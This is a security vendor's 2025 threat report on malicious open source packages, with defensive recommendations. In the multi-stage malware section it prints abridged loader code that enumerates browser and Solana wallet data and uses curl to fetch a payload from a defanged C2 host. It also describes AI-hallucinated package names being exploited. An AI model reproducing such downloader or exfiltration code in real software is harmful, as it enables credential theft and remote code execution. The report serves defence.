---
title: "The Landscape of Malicious Open Source Packages: 2025 Mid‑Year Threat Report"
short_title: "Malicious Open Source Packages: 2025 Mid‑Year Threat Report"
date: 2025-05-14 12:00:00 +0000
categories: [Threat Reports]
tags: [Typosquatting, Obfuscation, Infostealer, Slopsquatting]
author: kirill_and_philipp
canonical_url: https://socket.dev/blog/malicious-open-source-packages-2025-mid-year-threat-report
source: Socket
image:
  path: https://cdn.sanity.io/images/cgdhsj6q/production/9f8580110e3f17a1137499279d45f87b7d13e0fe-1024x1024.png
  alt: "The Landscape of Malicious Open Source Packages: 2025 Mid‑Year Threat Report"
description: "A look at the top trends in how threat actors are weaponizing open source packages to deliver malware and persist across the software supply chain."
---

In the first half of 2025, the Socket Threat Research Team documented how threat actors weaponized seemingly benign libraries to deliver infostealers, remote shells, and automated cryptocurrency drainers deep within software supply chains. This article translates that research into actionable guidance, explaining how malicious packages infiltrate registries, bypass scanners, and persist in developer environments.

## Exploring the Attack Surface

Open source software now underpins modern development. With ecosystems like npm for Node.js, PyPI for Python, Go Module, Maven Central, RubyGems, and many other registries, developers can build complete features in hours instead of weeks. But this speed comes at a cost. [70–90%](https://www.linuxfoundation.org/blog/blog/a-summary-of-census-ii-open-source-software-application-libraries-the-world-depends-on) of a typical codebase consists of third-party packages, each one introducing an implicit trust relationship that threat actors are eager to exploit.

![Dependency graph for the express package](https://cdn.sanity.io/images/cgdhsj6q/production/71358a82f87999839f0cdd41e9dc71d4e65b2514-1308x935.png)
_This image shows a live dependency graph for the popular [`express`](https://socket.dev/npm/package/express) package, generated using `npmgraph.js.org`. Each node represents a direct or transitive dependency. The graph highlights the complexity of modern package ecosystems, where a single package like `express` pulls in dozens of nested dependencies — each introducing its own security and maintenance risks._

Ten years ago, shipping a new feature meant writing custom code and manually optimizing core routines. Today, the value lies in integration — developers assemble prebuilt modules while AI assistants autocomplete code and suggest libraries to import. GitHub now hosts over 400 million repositories, and both npm and PyPI serve billions of downloads each week. Developers almost never inspect every transitive dependency, and, without proper dependency management, automated CI pipelines may end up blindly installing the latest versions of packages.

![Growth of open source ecosystems](https://cdn.sanity.io/images/cgdhsj6q/production/efbb70583095f07d9665b037af66f5556db7e10f-1378x442.png)

However, threat actors have also adapted to the rise of AI. The same tools that accelerate legitimate development now enable attackers to mass-generate look-alike package names, obfuscate payloads, and repeatedly publish modified versions that bypass signature-based scanners. As a result, the attack surface has become both vast and is constantly shifting.

## Six Adversarial Methods We See Again and Again

In the first half of 2025, we observed threat actors consistently combining multiple malicious techniques to maximize the impact of their campaigns across open source ecosystems. As we continue to investigate this evolving threat landscape, we have identified six techniques that frequently appear — and often overlap — in real-world attacks. This is not an exhaustive list, nor is it ranked by frequency or severity. Rather, it reflects recurring patterns our team has tracked, analyzed, and reported across major package registries. We disclose every malicious package we uncover to the relevant registry maintainers to help protect the broader open source community.

## 1. Typosquatting — A Single Letter That Changes Everything

Threat actors register packages with names that closely resemble popular libraries, differing by just a character or two — for example, [`metamask` vs. `metamaks`](https://socket.dev/blog/massive-npm-malware-campaign-leverages-ethereum-smart-contracts), or [`browser-cookie3` vs. `browser-cookies3`](https://socket.dev/blog/typosquatting-on-pypi-malicious-package-mimics-popular-browser-cookie-library). Package managers prioritize lexical similarity in search results, and developers — rushed or guided by overconfident AI code assistants — often fail to notice the difference. In one PyPI [incident](https://socket.dev/blog/typosquatting-on-pypi-malicious-package-mimics-popular-browser-cookie-library), a typosquatted package harvested Chrome credentials, captured screenshots, and exfiltrated the data using a Discord webhook.

> **Defensive Recommendations:** Typosquatting affects every major ecosystem — including npm, PyPI, Go, Maven, RubyGems, and NuGet — because it exploits naming similarity rather than ecosystem-specific flaws. A single mistyped import can compromise thousands of downstream builds. To defend against this, automate checks for lookalike package names and maintain an allowlist of approved dependencies for critical systems and production environments.

![Typosquatting campaign in the Go ecosystem](https://cdn.sanity.io/images/cgdhsj6q/production/a2fcd8ccc9e6019106a53843dc3a14687123e47f-1088x853.png)
_This screenshot from the Go ecosystem highlights a real-world [typosquatting campaign](https://socket.dev/blog/typosquatted-go-packages-deliver-malware-loader). Multiple malicious packages — each impersonating the legitimate `hypert` module — appear nearly identical in name and description. Go (pun intended) figure which one is the right one. "You've gotta ask yourself a question: Do I feel lucky?" Identifying the real package in a list like this isn't as easy as it looks._

## 2. Repository and Caching Abuse — When the Mirror Lies

The Go Module Mirror was built for efficiency and reliability, but its long-term caching mechanism turned into an asset for threat actors. In 2021, a threat actor created a [backdoored clone](https://socket.dev/blog/malicious-package-exploits-go-module-proxy-caching-for-persistence) of the popular `boltdb/bolt` module and pushed it to GitHub. The malicious code included an obfuscated command and control (C2) routine split across `db.go` and `cursor.go` files. Although the threat actor later reverted the repository to its legitimate state, the Go Module Mirror had already cached the malicious version — and continued serving it for three years to anyone who ran `go get`. The embedded backdoor connected to `49.12.198[.]231:20022`, and enabled remote code execution, allowing the threat actor to control infected systems via this C2 server.

> **Defensive Recommendations:** The same infrastructure that enables seamless package distribution also opens the door to supply chain attacks. In the Go ecosystem, abuse of the Module Mirror's caching mechanism allowed a malicious package to persist undetected for years. To defend against this, analyze the actual contents of installed packages — not just their source repositories. This approach helps uncover obfuscated code, unexpected network behavior, and unauthorized command execution before the package reaches production.

## 3. Obfuscation — Concealing Malicious Behavior

Threat actors use obfuscation to hide malicious behavior and evade detection. They replace meaningful variable names with random identifiers, strip formatting to compress the code, and insert junk operations to confuse static analysis tools. They often encode logic using Base64, hexadecimal, or numeric transpositions to conceal network destinations or payloads. While these techniques can bypass basic scanners, they still leave behind detectable clues — like long encoded strings or suspicious `eval()` calls — that defenders can flag.

![Obfuscated vs deobfuscated JavaScript code](https://cdn.sanity.io/images/cgdhsj6q/production/58102b2faa6b81a441143c0357609627c1e57ac9-2048x1090.png)

This image displays heavily obfuscated JavaScript code on the left and its deobfuscated version on the right. The original script uses randomized variable names and dense formatting to make analysis difficult — a common tactic in malicious packages. Threat actors often [rely on online JavaScript obfuscators](https://socket.dev/blog/exploiting-npm-to-build-a-blockchain-powered-botnet) to achieve this, while defenders can use free automated deobfuscators to uncover embedded URLs, commands, or payloads.

> **Defensive Recommendation:** Treat obfuscation as a warning sign. During installation, analyze packages for minified code, suspicious encoding, or opaque install scripts. Integrate static checks into your CI pipeline to detect and review obfuscated logic before it reaches production.

## 4. Multi‑Stage Malware — Deferred Payloads and Staged Execution

Multi-stage malware segments functionality across several payloads, often starting with a lightweight script that appears harmless. This tactic delays harmful activity, reducing the chance of early detection. A common pattern uses a post-installation script to silently download a second-stage payload after installation completes. In one [campaign](https://socket.dev/blog/lazarus-strikes-npm-again-with-a-new-wave-of-malicious-packages) linked to North Korean threat actors, the initial package delivered a loader called "BeaverTail" that stole browser data and Solana wallet credentials. It then fetched and deployed a more advanced backdoor named "InvisibleFerret". Below is a [code](https://socket.dev/npm/package/is-buffer-validator/files/1.0.0/index.js) snippet demonstrating part of this multi-stage process:

```javascript
// Enumerate user profiles and extract browser data
async function uploadFiles(basePath, prefix, includeSolana, timestamp) {
    if (!testPath(basePath)) return;

    for (let i = 0; i < 200; i++) {
        const profileDir = `${basePath}/${i === 0 ? 'Default' : 'Profile ' + i}/Local Extension Settings`;
        // Look for known extension data (.log/.ldb files)
    }

    if (includeSolana) {
        const solanaPath = `${homeDir}/.config/solana/id.json`;
        if (fs.existsSync(solanaPath)) {
            // Extract and exfiltrate Solana wallet credentials
        }
    }

    // Upload stolen data to C2 server
}
```

This function performs silent enumeration and exfiltration of browser and wallet data. The process continues by retrieving additional malware:

```javascript
function runP() {
    const pFile = `${tmpDir}\p.zi`;
    const p2File = `${tmpDir}\p2.zip`;

    if (fs.existsSync(pFile)) {
        // Check file size; rename to .zip for extraction
    } else {
        // Download payload from C2
        ex(`curl -Lo "${pFile}" "hxxp://172.86.84[.]38:1224/pdown"`, (error) => {
            if (!error) {
                // Rename, extract, and execute
            }
        });
    }
}
```

This deferred execution strategy keeps the initial code small and less suspicious, while the second-stage payload — InvisibleFerret backdoor — is retrieved and executed later.

> **Defensive Recommendation:** Monitor install-time network activity and watch for signs of second-stage payload downloads. Block unexpected outbound connections from development environments, and audit install scripts for downloader behavior. Use sandboxing to observe post-install execution and flag any package that retrieves binaries or remote code.

## 5. Automation and AI — Malware at Machine Speed

Threat actors increasingly use automation and AI to scale malicious package creation and delivery. In our research we found that threat actors use AI tools to [generate](https://socket.dev/blog/exploiting-npm-to-build-a-blockchain-powered-botnet) large volumes of typosquatted package names, obfuscate payloads, and inject misleading comments designed to bypass code scanners. In some cases, the obfuscation [includes](https://socket.dev/blog/malicious-maven-package-impersonating-xz-for-java-library) hidden shell commands reconstructed from byte arrays at runtime, allowing backdoors to launch undetected.

These tools dramatically reduce manual effort. A single operator can automate the deployment of hundreds of packages — each uniquely obfuscated to evade hash-based detection — in just a few hours. In one [campaign](https://socket.dev/blog/massive-npm-malware-campaign-leverages-ethereum-smart-contracts), a threat actor published 280 malicious packages to npm registry over a single weekend using automation.

AI's role goes beyond creation. It also introduces risk through hallucinated recommendations. Language models sometimes suggest nonexistent packages — a weakness threat actors exploit through "[slopsquatting](https://socket.dev/blog/slopsquatting-how-ai-hallucinations-are-fueling-a-new-class-of-supply-chain-attacks)", where they register those fake names to deliver malicious payloads.

Search engines can amplify this risk. In one case, Google's AI Overview [praised](https://socket.dev/blog/gmail-for-exfiltration-malicious-npm-packages-target-solana-private-keys-and-drain-victim-s) a malicious package by echoing content from the README of a legitimate one, giving the malicious package an undeserved appearance of credibility.

![Google AI search results for malicious package](https://cdn.sanity.io/images/cgdhsj6q/production/040fdad9ee24e47170d8c048ad60358474486409-1600x1250.png)
_This [screenshot](https://socket.dev/blog/gmail-for-exfiltration-malicious-npm-packages-target-solana-private-keys-and-drain-victim-s) shows Google's AI-generated search results at the time we discovered the malicious `@async-mutex/mutex` package._

From these examples we can see that automation and AI are not just defender tools — they are deeply embedded in the modern threat actor's toolkit.

> **Defensive Recommendation:** Monitor for sudden bursts of packages from the same author, repeated obfuscation patterns, and rapid publishing activity. Flag packages recommended by AI tools if they lack external validation or contain weak metadata. Integrate LLM-specific heuristics into your threat models to catch prompt injection attempts, hallucinated package names, and misleading AI-generated comments.

## 6. Weaponizing Legitimate Services — Hiding in Plain Sight

Threat actors increasingly abuse legitimate services and developer tools to exfiltrate data and evade detection. These services — trusted by default in many CI/CD environments — are repurposed to carry out malicious tasks while blending into normal network activity.

In one npm campaign, a threat actor [used](https://socket.dev/blog/gmail-for-exfiltration-malicious-npm-packages-target-solana-private-keys-and-drain-victim-s) the `nodemailer` library to send stolen Solana private keys via Gmail. The exfiltration was implemented within an install script, using hardcoded credentials and SMTP settings. Another example involved abuse of [Sentry](https://socket.dev/blog/author-typosquatting-on-npm) — a legitimate error tracking service — by using a `chalk`-lookalike package to send environment variables as fake error reports to a private Sentry project controlled by a threat actor.

In the RubyGems and other ecosystems, threat actors similarly [misuse](https://socket.dev/blog/weaponizing-oast-how-malicious-packages-exploit-npm-pypi-and-rubygems) Out-of-Band Application Security Testing (OAST) infrastructure, which was originally designed for ethical security testing. The traffic — often DNS-based — blends in with legitimate scanning activity, making it hard for defenders to spot malicious behavior. In another [case](https://socket.dev/blog/typosquatting-on-pypi-malicious-package-mimics-popular-browser-cookie-library), we decompiled malware built with PyInstaller and uncovered modules that captured Chrome passwords and desktop screenshots, then exfiltrated the data to a Discord webhook disguised as telemetry.

Threat actors turn trusted platforms into covert C2 channels or exfiltration pipelines. When traffic shows familiar services like Gmail, OAST, Sentry, or Discord, many organizations fail to flag it as malicious — leaving a persistent blind spot in their defenses.

> **Defensive Recommendation:** Inspect outbound connections during install scripts and sandbox their runtime behavior to catch misuse of SMTP, webhooks, or telemetry APIs. Avoid blanket allowlisting of popular domains, and actively monitor for abuse patterns — even when traffic appears to involve legitimate tools or services.

## Outlook and Recommendations

The volume and complexity of open source packages continue to increase across ecosystems. Modern applications rely heavily on these components, often comprising thousands of transitive dependencies. This interconnectivity — while enabling rapid innovation — also creates a broad and opaque attack surface.

Threat actors will continue to exploit this environment by embedding malware in packages that blend into normal developer workflows. The techniques outlined in this article, ranging from typosquatting and multi-stage loaders to misuse of legitimate services, show that modern malware is built not just to compromise systems, but to persist undetected within development pipelines.

To counter this, defenders must focus on behavioral signals, such as unexpected postinstall scripts, file overwrites, and unauthorized outbound traffic, while validating third-party packages before use. Static and dynamic analysis, version pinning, and close inspection of CI/CD logs are essential to detecting malicious dependencies before they reach production.

Socket's free tools are purpose-built for this threat landscape. The [Socket GitHub App](https://socket.dev/features/github) blocks pull requests that introduce suspicious packages, the [Socket CLI](https://socket.dev/features/cli) flags risky behavior during installation, and the [Socket browser extension](https://socket.dev/features/web-extension) provides real-time alerts about malware and typosquats directly on package pages. Together, these tools help detect and prevent supply chain attacks before they take hold.
